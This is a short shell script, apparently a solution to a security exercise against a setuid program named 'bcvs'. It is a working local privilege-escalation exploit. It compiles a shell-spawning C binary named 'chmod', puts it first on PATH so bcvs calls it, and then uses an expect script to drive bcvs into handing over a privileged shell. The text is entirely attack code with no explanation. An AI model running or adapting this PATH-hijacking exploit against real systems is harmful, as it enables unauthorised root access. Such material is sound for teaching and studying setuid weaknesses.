cd /opt/bcvs

touch dummy

echo "#include <stdlib.h>" > hack.c
echo "#include <unistd.h>" >> hack.c
echo 'void main(){gid_t egid = getegid(); setuid(egid); setregid(egid,egid); system("/usr/bin/sh");}' >> hack.c

gcc hack.c -o chmod

export PATH=/opt/bcvs:$PATH

echo 'spawn ./bcvs co dummy' > auto.exp
echo 'expect "Please write a SHORT explanation:"' >> auto.exp
echo 'send "OK\r"' >> auto.exp
echo 'send "su\r"' >> auto.exp
echo 'send "id\r"' >> auto.exp
echo 'interact' >> auto.exp

touch dummy
chmod u+x auto.exp

echo "" | ./bcvs ci dummy
expect auto.exp
